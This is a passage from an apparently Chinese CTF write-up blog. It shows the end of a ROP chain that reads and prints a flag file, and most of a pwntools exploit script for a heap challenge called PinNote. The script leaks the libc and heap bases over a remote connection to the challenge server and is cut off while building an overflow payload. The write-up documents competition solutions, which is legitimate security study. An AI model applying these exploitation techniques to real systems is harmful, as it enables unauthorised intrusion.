+</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rax_rdx_rbx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>257</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>syscall</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rsi</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>flag_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rax_rdx_rbx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x30</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>syscall</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rsi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>flag_addr</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rax_rdx_rbx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x30</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>syscall</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;flag</span><span class=se>\x00\x00\x00\x00</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>)))</span>
+</span></span><span class=line><span class=cl><span class=n>se</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>op</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>flag：</p><p><img src=https://su-team.cn/img/2025-QWNT/47.png alt=img></p><h2 id=pinnote>PinNote</h2><p>看了一圈没看出问题，直到测这个 tmp/pin* 文件</p><p><img src=https://su-team.cn/img/2025-QWNT/48.png alt=img></p><p>如果两个进程同时指向一个文件，就可以篡改size,</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span><span class=lnt>136
+</span><span class=lnt>137
+</span><span class=lnt>138
+</span><span class=lnt>139
+</span><span class=lnt>140
+</span><span class=lnt>141
+</span><span class=lnt>142
+</span><span class=lnt>143
+</span><span class=lnt>144
+</span><span class=lnt>145
+</span><span class=lnt>146
+</span><span class=lnt>147
+</span><span class=lnt>148
+</span><span class=lnt>149
+</span><span class=lnt>150
+</span><span class=lnt>151
+</span><span class=lnt>152
+</span><span class=lnt>153
+</span><span class=lnt>154
+</span><span class=lnt>155
+</span><span class=lnt>156
+</span><span class=lnt>157
+</span><span class=lnt>158
+</span><span class=lnt>159
+</span><span class=lnt>160
+</span><span class=lnt>161
+</span><span class=lnt>162
+</span><span class=lnt>163
+</span><span class=lnt>164
+</span><span class=lnt>165
+</span><span class=lnt>166
+</span><span class=lnt>167
+</span><span class=lnt>168
+</span><span class=lnt>169
+</span><span class=lnt>170
+</span><span class=lnt>171
+</span><span class=lnt>172
+</span><span class=lnt>173
+</span><span class=lnt>174
+</span><span class=lnt>175
+</span><span class=lnt>176
+</span><span class=lnt>177
+</span><span class=lnt>178
+</span><span class=lnt>179
+</span><span class=lnt>180
+</span><span class=lnt>181
+</span><span class=lnt>182
+</span><span class=lnt>183
+</span><span class=lnt>184
+</span><span class=lnt>185
+</span><span class=lnt>186
+</span><span class=lnt>187
+</span><span class=lnt>188
+</span><span class=lnt>189
+</span><span class=lnt>190
+</span><span class=lnt>191
+</span><span class=lnt>192
+</span><span class=lnt>193
+</span><span class=lnt>194
+</span><span class=lnt>195
+</span><span class=lnt>196
+</span><span class=lnt>197
+</span><span class=lnt>198
+</span><span class=lnt>199
+</span><span class=lnt>200
+</span><span class=lnt>201
+</span><span class=lnt>202
+</span><span class=lnt>203
+</span><span class=lnt>204
+</span><span class=lnt>205
+</span><span class=lnt>206
+</span><span class=lnt>207
+</span><span class=lnt>208
+</span><span class=lnt>209
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=c1>#from ctypes import CDLL</span>
+</span></span><span class=line><span class=cl><span class=c1>#cdl = CDLL(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)</span>
+</span></span><span class=line><span class=cl><span class=n>s</span>    <span class=o>=</span> <span class=k>lambda</span>   <span class=n>x</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sa</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>y</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sl</span>   <span class=o>=</span> <span class=k>lambda</span>   <span class=n>x</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span>  <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>y</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>r</span>    <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>ru</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>rl</span>   <span class=o>=</span> <span class=k>lambda</span>     <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>itr</span>  <span class=o>=</span> <span class=k>lambda</span>     <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>uu32</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>u32</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>uu64</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>u64</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>ls</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>lss</span>  <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>ls</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\033</span><span class=s1>[1;31;40m</span><span class=si>%s</span><span class=s1> -&gt; 0x</span><span class=si>%x</span><span class=s1> </span><span class=se>\033</span><span class=s1>[0m&#39;</span> <span class=o>%</span> <span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=nb>eval</span><span class=p>(</span><span class=n>x</span><span class=p>)))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>attack</span> <span class=o>=</span> <span class=s1>&#39;1.1.11 123&#39;</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>,</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=s1>&#39;./pin_note&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>(</span><span class=n>argv</span><span class=o>=</span><span class=p>[],</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span><span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span><span class=n>gdbscript</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>TAG</span><span class=p>:</span><span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=o>*</span><span class=n>args</span><span class=o>.</span><span class=n>TAG</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>),</span><span class=n>ssl</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>REM</span><span class=p>:</span><span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=o>*</span><span class=n>attack</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>process</span><span class=p>([</span><span class=n>binary</span><span class=p>]</span> <span class=o>+</span> <span class=n>argv</span><span class=p>,</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#context(arch=&#39;amd64&#39;, log_level = &#39;debug&#39;)</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>binary</span> <span class=o>=</span> <span class=n>binary</span><span class=p>,</span> <span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl><span class=n>terminal</span><span class=o>=</span><span class=s1>&#39;tmux splitw -h -l 170&#39;</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>libc</span>
+</span></span><span class=line><span class=cl><span class=n>elf</span>  <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>binary</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=c1>#print(context.binary.libs)</span>
+</span></span><span class=line><span class=cl><span class=c1>#libc = ELF(&#39;./libc.so.6&#39;)</span>
+</span></span><span class=line><span class=cl><span class=c1>#import socks</span>
+</span></span><span class=line><span class=cl><span class=c1>#context.proxy = (socks.SOCKS5, &#39;192.168.31.251&#39;, 10808)</span>
+</span></span><span class=line><span class=cl><span class=n>gdbscript</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
+</span></span></span><span class=line><span class=cl><span class=s1>brva 0x02814
+</span></span></span><span class=line><span class=cl><span class=s1>brva 0x024F9
+</span></span></span><span class=line><span class=cl><span class=s1>brva 0x02A01
+</span></span></span><span class=line><span class=cl><span class=s1>#continue
+</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=o>**</span><span class=nb>locals</span><span class=p>())</span>
+</span></span><span class=line><span class=cl><span class=c1>#import os</span>
+</span></span><span class=line><span class=cl><span class=c1>#os.systimport os</span>
+</span></span><span class=line><span class=cl><span class=c1>#io = remote(*attack.split(&#39;:&#39;))</span>
+</span></span><span class=line><span class=cl><span class=c1>#io = start([])</span>
+</span></span><span class=line><span class=cl><span class=c1>#p = start([])</span>
+</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;pwn-ba8fe96c99.challenge.xctf.org.cn&#34;</span><span class=p>,</span> <span class=mi>9999</span><span class=p>,</span> <span class=n>ssl</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;pwn-ba8fe96c99.challenge.xctf.org.cn&#34;</span><span class=p>,</span> <span class=mi>9999</span><span class=p>,</span> <span class=n>ssl</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sc_pwd</span><span class=p>(</span><span class=n>pwd</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;select: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;rs): &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=n>pwd</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>note</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;select: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>size</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;$&gt; &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;add&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;note: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span><span class=n>size</span><span class=p>,</span><span class=n>text</span><span class=o>=</span><span class=s1>&#39;123&#39;</span><span class=p>,</span><span class=n>y</span><span class=o>=</span><span class=mi>1</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;$&gt; &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;edit&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;edit: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;newsize: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;(y/n): &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>y</span><span class=o>==</span><span class=mi>1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;y&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;note: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>s</span><span class=p>(</span><span class=n>text</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;n&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;$&gt; &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;show&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;show: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rm</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;$&gt; &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;del&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;delete: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>pwd</span> <span class=o>=</span> <span class=s1>&#39;M&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>sc_pwd</span><span class=p>(</span><span class=n>pwd</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>note</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x500</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>rm</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Content: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x21b110</span>
+</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>libc_base</span>
+</span></span><span class=line><span class=cl><span class=n>lss</span><span class=p>(</span><span class=s1>&#39;libc_base&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x3f0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x108</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x108</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>rm</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x108</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Content: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>5</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>heap_base</span> <span class=o>=</span> <span class=n>key</span> <span class=o>&lt;&lt;</span> <span class=mh>0xC</span>
+</span></span><span class=line><span class=cl><span class=n>lss</span><span class=p>(</span><span class=s1>&#39;key&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>lss</span><span class=p>(</span><span class=s1>&#39;heap_base&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x108</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;select: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;rs): &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>pwd</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;select: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>6</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;$&gt; &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;add&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;note: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mh>0x200</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>rm</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>rm</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mh>0x108</span>
+</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x111</span><span class=p>)</span>
